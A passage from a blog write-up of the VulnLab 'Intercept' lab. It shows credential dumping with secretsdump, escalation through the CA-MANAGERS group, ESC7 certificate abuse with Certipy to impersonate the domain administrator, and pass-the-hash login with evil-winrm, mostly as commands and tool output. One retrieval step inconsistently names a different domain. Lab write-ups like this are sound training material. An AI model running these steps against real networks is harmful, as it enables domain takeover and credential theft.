<h3 id="Step-6-Dump-Credentials"><a href="#Step-6-Dump-Credentials" class="headerlink" title="Step 6: Dump Credentials"></a>Step 6: Dump Credentials</h3><p>Export the Kerberos ticket and dump the credentials from WS01:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">impacket-secretsdump -k -no-pass ws01.intercept.vl</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Extracting-Credentials"><a href="#Extracting-Credentials" class="headerlink" title="Extracting Credentials"></a>Extracting Credentials</h2><p>We successfully extract the Administrator hash:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;HASH&gt;:::</span><br></pre></td></tr></table></figure>

<p>And the cleartext password for <code>Simon.Bowen</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] _SC_HelpdeskService </span><br><span class="line">Simon.Bowen@intercept.vl:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Privilege-Escalation-via-CA-MANAGERS-Group"><a href="#Privilege-Escalation-via-CA-MANAGERS-Group" class="headerlink" title="Privilege Escalation via CA-MANAGERS Group"></a>Privilege Escalation via CA-MANAGERS Group</h2><p>Since <code>Simon.Bowen</code> has <code>GenericAll</code> permissions over the <code>CA-MANAGERS</code> group, we can add ourselves to it:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc group addmem &quot;CA-MANAGERS&quot; &quot;Simon.Bowen&quot; -U &quot;INTERCEPT.VL&quot;/&quot;Simon.Bowen&quot;%&#x27;&lt;PASS&gt;&#x27; -S &quot;dc01.intercept.vl&quot;</span><br></pre></td></tr></table></figure>

<p>Verify the group membership:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc group members &quot;CA-MANAGERS&quot; -U &quot;INTERCEPT.VL&quot;/&quot;Simon.Bowen&quot;%&#x27;&lt;PASS&gt;&#x27; -S &quot;dc01.intercept.vl&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Alternative method using bloodyAD:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -d corp.local --host 172.16.1.5 -u user -p ... add groupMember &#x27;user&#x27; group</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Exploiting-ESC7-Active-Directory-Certificate-Services"><a href="#Exploiting-ESC7-Active-Directory-Certificate-Services" class="headerlink" title="Exploiting ESC7 - Active Directory Certificate Services"></a>Exploiting ESC7 - Active Directory Certificate Services</h2><p>Enumerate certificate templates using Certipy:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -target 10.10.218.37 -dc-ip 10.10.218.37 -u &#x27;Simon.Bowen&#x27; -p &#x27;&lt;PASS&gt;&#x27; -debug -vulnerable</span><br></pre></td></tr></table></figure>

<h3 id="Vulnerable-CA-Configuration"><a href="#Vulnerable-CA-Configuration" class="headerlink" title="Vulnerable CA Configuration"></a>Vulnerable CA Configuration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : intercept-DC01-CA</span><br><span class="line">    DNS Name                            : DC01.intercept.vl</span><br><span class="line">    Certificate Subject                 : CN=intercept-DC01-CA, DC=intercept, DC=vl</span><br><span class="line">    Certificate Serial Number           : 363C8F207710ECA145882994517A9848</span><br><span class="line">    Certificate Validity Start          : 2023-06-27 13:24:59+00:00</span><br><span class="line">    Certificate Validity End            : 2125-11-16 11:16:26+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : INTERCEPT.VL\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        Enroll                          : INTERCEPT.VL\Authenticated Users</span><br><span class="line">        ManageCa                        : INTERCEPT.VL\ca-managers</span><br><span class="line">                                          INTERCEPT.VL\Domain Admins</span><br><span class="line">                                          INTERCEPT.VL\Enterprise Admins</span><br><span class="line">                                          INTERCEPT.VL\Administrators</span><br><span class="line">        ManageCertificates              : INTERCEPT.VL\Domain Admins</span><br><span class="line">                                          INTERCEPT.VL\Enterprise Admins</span><br><span class="line">                                          INTERCEPT.VL\Administrators</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC7                              : &#x27;INTERCEPT.VL\\ca-managers&#x27; has dangerous permissions</span><br><span class="line">Certificate Templates                   : [!] Could not find any certificate templates</span><br></pre></td></tr></table></figure>

<p>The CA is vulnerable to <strong>ESC7</strong>, which allows members of <code>ca-managers</code> to issue certificates arbitrarily.</p>
<p><strong>Reference:</strong> <a target="_blank" rel="noopener" href="https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/">Active Directory Certificate Attack - ESC7</a></p>
<hr>
<h2 id="ESC7-Exploitation-Steps"><a href="#ESC7-Exploitation-Steps" class="headerlink" title="ESC7 Exploitation Steps"></a>ESC7 Exploitation Steps</h2><h3 id="Step-1-Add-Simon-as-an-Officer"><a href="#Step-1-Add-Simon-as-an-Officer" class="headerlink" title="Step 1: Add Simon as an Officer"></a>Step 1: Add Simon as an Officer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy ca -ca intercept-DC01-CA -dc-ip 10.10.218.37 -u &#x27;Simon.Bowen&#x27; -p &#x27;&lt;PASS&gt;&#x27; -add-officer Simon.Bowen</span><br></pre></td></tr></table></figure>

<h3 id="Step-2-Request-a-SubCA-Certificate"><a href="#Step-2-Request-a-SubCA-Certificate" class="headerlink" title="Step 2: Request a SubCA Certificate"></a>Step 2: Request a SubCA Certificate</h3><p>Request a certificate using the SubCA template with the Administrator UPN:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -ca intercept-DC01-CA -dc-ip 10.10.218.37 -u &#x27;Simon.Bowen&#x27; -p &#x27;&lt;PASS&gt;&#x27; -template SubCA -target dc01.intercept.vl -upn administrator@intercept.vl</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> When prompted <code>Would you like to save the private key? (y/N)</code>, press <code>y</code>.</p>
<h3 id="Step-3-Issue-the-Failed-Certificate"><a href="#Step-3-Issue-the-Failed-Certificate" class="headerlink" title="Step 3: Issue the Failed Certificate"></a>Step 3: Issue the Failed Certificate</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy ca -ca intercept-DC01-CA -dc-ip 10.10.218.37 -u &#x27;Simon.Bowen&#x27; -p &#x27;&lt;PASS&gt;&#x27; -issue-request (ID of your cert)</span><br></pre></td></tr></table></figure>

<h3 id="Step-4-Retrieve-the-Issued-Certificate"><a href="#Step-4-Retrieve-the-Issued-Certificate" class="headerlink" title="Step 4: Retrieve the Issued Certificate"></a>Step 4: Retrieve the Issued Certificate</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -ca intercept-DC01-CA -dc-ip 10.10.218.37 -u &#x27;Simon.Bowen&#x27; -p &#x27;&lt;PASS&gt;&#x27; -template SubCA -target dc01.intercept.vl -upn administrator@shield.local -retrieve (ID of your cert)</span><br></pre></td></tr></table></figure>

<h3 id="Step-5-Authenticate-and-Obtain-Administrator-Hash"><a href="#Step-5-Authenticate-and-Obtain-Administrator-Hash" class="headerlink" title="Step 5: Authenticate and Obtain Administrator Hash"></a>Step 5: Authenticate and Obtain Administrator Hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Final-Access"><a href="#Final-Access" class="headerlink" title="Final Access"></a>Final Access</h2><p>Use the obtained administrator hash to access the domain controller via WinRM:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.intercept.vl -u &#x27;administrator&#x27; -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure>

<p>Congratulations! You now have Domain Administrator access and can retrieve the root flag.</p>
<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=65de1d68-c470-41c4-b3d9-f46f9e047e8c">https://api.vulnlab.com/api/v1/share?id=65de1d68-c470-41c4-b3d9-f46f9e047e8c</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writeups</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intercept-Chain-VulnLab-Hack-The-Box-Writeup-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Intercept Chain - VulnLab &#x2F; Hack The Box Writeup &amp; Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Target-Information"><span class="toc-number">1.2.1.</span> <span class="toc-text">Target Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-DC01"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - DC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-WS01"><span class="toc-number">1.2.3.</span> <span class="toc-text">Nmap Scan - WS01</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration-Relay-Target-Identification"><span class="toc-number">1.3.</span> <span class="toc-text">SMB Enumeration &amp; Relay Target Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capturing-NTLM-Hashes"><span class="toc-number">1.4.</span> <span class="toc-text">Capturing NTLM Hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration-with-BloodHound"><span class="toc-number">1.5.</span> <span class="toc-text">Active Directory Enumeration with BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Key-Findings"><span class="toc-number">1.5.1.</span> <span class="toc-text">Key Findings</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebClient-Service-Exploitation"><span class="toc-number">1.6.</span> <span class="toc-text">WebClient Service Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Strategy"><span class="toc-number">1.6.1.</span> <span class="toc-text">Attack Strategy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setting-Up-the-RBCD-Attack-Chain"><span class="toc-number">1.7.</span> <span class="toc-text">Setting Up the RBCD Attack Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1-Configure-DNS"><span class="toc-number">1.7.1.</span> <span class="toc-text">Step 1: Configure DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2-Create-a-Machine-Account"><span class="toc-number">1.7.2.</span> <span class="toc-text">Step 2: Create a Machine Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-Setup-NTLM-Relay"><span class="toc-number">1.7.3.</span> <span class="toc-text">Step 3: Setup NTLM Relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-4-Coerce-Authentication"><span class="toc-number">1.7.4.</span> <span class="toc-text">Step 4: Coerce Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-5-Request-Service-Ticket"><span class="toc-number">1.7.5.</span> <span class="toc-text">Step 5: Request Service Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-6-Dump-Credentials"><span class="toc-number">1.7.6.</span> <span class="toc-text">Step 6: Dump Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extracting-Credentials"><span class="toc-number">1.8.</span> <span class="toc-text">Extracting Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-via-CA-MANAGERS-Group"><span class="toc-number">1.9.</span> <span class="toc-text">Privilege Escalation via CA-MANAGERS Group</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-ESC7-Active-Directory-Certificate-Services"><span class="toc-number">1.10.</span> <span class="toc-text">Exploiting ESC7 - Active Directory Certificate Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-CA-Configuration"><span class="toc-number">1.10.1.</span> <span class="toc-text">Vulnerable CA Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC7-Exploitation-Steps"><span class="toc-number">1.11.</span> <span class="toc-text">ESC7 Exploitation Steps</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1-Add-Simon-as-an-Officer"><span class="toc-number">1.11.1.</span> <span class="toc-text">Step 1: Add Simon as an Officer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2-Request-a-SubCA-Certificate"><span class="toc-number">1.11.2.</span> <span class="toc-text">Step 2: Request a SubCA Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-Issue-the-Failed-Certificate"><span class="toc-number">1.11.3.</span> <span class="toc-text">Step 3: Issue the Failed Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-4-Retrieve-the-Issued-Certificate"><span class="toc-number">1.11.4.</span> <span class="toc-text">Step 4: Retrieve the Issued Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-5-Authenticate-and-Obtain-Administrator-Hash"><span class="toc-number">1.11.5.</span> <span class="toc-text">Step 5: Authenticate and Obtain Administrator Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Final-Access"><span class="toc-number">1.12.</span> <span class="toc-text">Final Access</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/16/VL-Intercept/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&text=VL-Intercept"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&is_video=false&description=VL-Intercept"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=VL-Intercept&body=Check out this article: https://panosoikogr.github.io/2025/11/16/VL-Intercept/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&name=VL-Intercept&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&t=VL-Intercept"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2027
    Panosoiko
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writeups</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

</body>
</html>
